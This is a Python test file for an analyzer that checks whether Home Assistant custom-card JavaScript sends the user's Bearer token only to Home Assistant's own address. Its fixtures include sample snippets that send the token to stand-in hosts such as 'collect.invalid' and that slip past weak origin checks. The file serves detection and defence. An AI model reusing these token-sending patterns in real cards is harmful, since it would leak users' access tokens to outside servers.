"""(0.15) Card token sent to Home Assistant itself, the shapes from the full Marketplace run.

Each proven shape stands for real findings (the names changed); each kept one is a way a
hostile card could try to look the same. No JavaScript runs: everything is a text read.
Hosts outside are .invalid.
"""

import time

import pytest

from sniff_test.analyzers.js_wrapper import _url_arg, ha_origin


def _check(code: str, fn: tuple[int, int, str] | None = None) -> bool:
    """The address of the last fetch( / .src = in `code`, checked at its own offset."""
    at = max(code.rfind("fetch("), code.rfind("img.src"))
    span = _url_arg(code, at, len(code))
    assert span is not None
    arg = code[span[0] : span[1]].strip()
    if arg.endswith(")") and code[at:].startswith("img.src"):
        pass
    end = arg.find(",{headers") if ",{headers" in arg else len(arg)
    return ha_origin(code, arg[:end].strip(), span[0], fn)


H = ",{headers:{Authorization:`Bearer ${t}`}})"


@pytest.mark.parametrize(
    "code",
    [
        # an early return unless the address is one of HA's own paths
        "async function a(bg){if(!bg.startsWith('/media/')){this.paint(bg);return;}"
        "const r=await fetch(bg" + H + "}",
        "async function a(u){if(!u||!u.startsWith('/media/'))return u;return fetch(u" + H + "}",
        "async function a(u){if(!String(u).startsWith('/api/x/'))throw new Error('no');"
        "return fetch(u" + H + "}",
        # through a flag, either way round
        "async function a(u){const local=String(u).startsWith('/api/x/');if(!local){return u;}"
        "return fetch(u" + H + "}",
        "async function a(u){const local=String(u).startsWith('/api/x/');if(local){"
        "const r=await fetch(u" + H + "}}",
        # inside the block of the check
        "async function a(u){if(u.startsWith('/api/x/')&&ok){const r=await fetch(u" + H + "}}",
        # the page's own origin, checked with new URL
        "function a(s){if(new URL(s.hassUrl).origin!==location.origin)return null;"
        "return{async tok(){const r=await fetch(`${s.hassUrl}/auth/token`" + H + "}}}",
    ],
)
def test_a_checked_address_is_proven(code):
    assert _check(code)


@pytest.mark.parametrize(
    "code",
    [
        # "/" alone lets "//other.host" through (a real card did this: it stays)
        "async function a(u){if(!u||!u.startsWith('/'))return u;return fetch(u" + H + "}",
        "async function a(u){if(!u.startsWith('//'))return;return fetch(u" + H + "}",
        "async function a(u){if(!u.startsWith('/\\\\'))return;return fetch(u" + H + "}",
        # the check in a comment or a string
        "async function a(u){// if(!u.startsWith('/api/'))return;\nreturn fetch(u" + H + "}",
        "async function a(u){/* if(!u.startsWith('/api/'))return; */return fetch(u" + H + "}",
        "async function a(u){const s=\"if(!u.startsWith('/api/'))return;\";return fetch(u"
        + H
        + "}",
        # an exit that doesn't always leave
        "async function a(u){if(!u.startsWith('/api/')){if(x)return;}return fetch(u" + H + "}",
        "async function a(u){if(!u.startsWith('/api/'))log(u);return fetch(u" + H + "}",
        # && in an exit: both must fail before it leaves
        "async function a(u){if(!u.startsWith('/api/')&&x)return;return fetch(u" + H + "}",
        # || in a block check: either may hold
        "async function a(u){if(u.startsWith('/api/')||x){return fetch(u" + H + "}}",
        # given another value after the check
        "async function a(u){if(!u.startsWith('/api/'))return;u=v;return fetch(u" + H + "}",
        "async function a(u){if(!u.startsWith('/api/'))return;setTimeout(()=>fetch(u"
        + H
        + ");u=v;}",
        # the check in another function, or in a block that has closed
        "function c(u){if(!u.startsWith('/api/'))return;}async function a(u){return fetch(u"
        + H
        + "}",
        "async function a(u){if(k){if(!u.startsWith('/api/'))return;}return fetch(u" + H + "}",
        # used in the else branch
        "async function a(u){if(u.startsWith('/api/')){x()}else{return fetch(u" + H + "}}",
        # a different address checked
        "async function a(u,v){if(!v.startsWith('/api/'))return;return fetch(u" + H + "}",
        # a let flag can change
        "async function a(u){let l=u.startsWith('/api/');l=true;if(!l)return;return fetch(u"
        + H
        + "}",
        # another object's origin, or the same origin compared the wrong way
        "function a(s){if(new URL(s.u).origin!==evil.origin)return;return fetch(s.u" + H + "}",
        "function a(s){if(new URL(s.u).origin===location.origin)return;return fetch(s.u" + H + "}",
    ],
)
def test_anything_else_keeps_the_finding(code):
    assert not _check(code)


@pytest.mark.parametrize(
    "code,ok",
    [
        # hassUrl(path) with brackets inside the path (the old pattern missed these)
        ("img.src=this._hass.hassUrl(`/api/camera_proxy_stream/${id}?token=${this._st(id)"
         ".attributes.access_token}`)", True),
        ("const url=this._hass.hassUrl(`/api/acme/${encodeURIComponent(r)}/x`);fetch(url" + H,
         True),
        ("fetch(hass.hassUrl()" + H, True),
        ("fetch(hass.hassUrl('@collect.invalid/c')" + H, False),
        ("fetch(hass.hassUrl(w)" + H, False),
        ("fetch(hass.hassUrl('/x')+'@collect.invalid'" + H, False),
    ],
)  # fmt: skip
def test_hass_url_reads_its_path_by_brackets(code, ok):
    assert _check(code) is ok


@pytest.mark.parametrize(
    "code,ok",
    [
        # HA's address in its login data
        ("const s=`${this._hass.auth.data.hassUrl}/acme/apexcharts.js`;img.src=s", True),
        ("const s=`${this._hass.auth.data.hassUrl}@collect.invalid`;img.src=s", False),
        # a static constant of the class
        ("class P{static get _apiBase(){return \"/acme/v1\";}async f(p){fetch(`${P._apiBase}"
         "${p}`" + H + "}}", True),
        ("class P{static get _apiBase(){return \"https://collect.invalid\";}async f(p){fetch("
         "`${P._apiBase}/x`" + H + "}}", False),
        ("class P{static get _apiBase(){return \"/acme/v1\";}}class Q{static get _apiBase(){"
         "return \"//collect.invalid\";}}async function f(p){fetch(`${P._apiBase}/x`" + H, False),
        ("class P{static get _apiBase(){return \"/acme/v1\";}}P._apiBase=e;async function f(){"
         "fetch(`${P._apiBase}/x`" + H, False),
        # the page's own host with a scheme picked in the code
        ("const w=location.protocol==='https:'?'wss:':'ws:';const u=`${w}//${location.host}"
         "/api/websocket`;img.src=u", True),
        ("const w=c?'wss:':x;const u=`${w}//${location.host}/api/websocket`;img.src=u", False),
    ],
)  # fmt: skip
def test_ha_address_in_its_login_data_static_constants_and_schemes(code, ok):
    assert _check(code) is ok


def test_guards_stay_fast_on_hostile_text():
    for hostile in ("if(" * 50_000, "if(!u.startsWith('/a')" * 20_000, "{" * 100_000):
        code = "async function a(u){" + hostile + "return fetch(u" + H + "}"
        t0 = time.perf_counter()
        _check(code)
        assert time.perf_counter() - t0 < 2.0
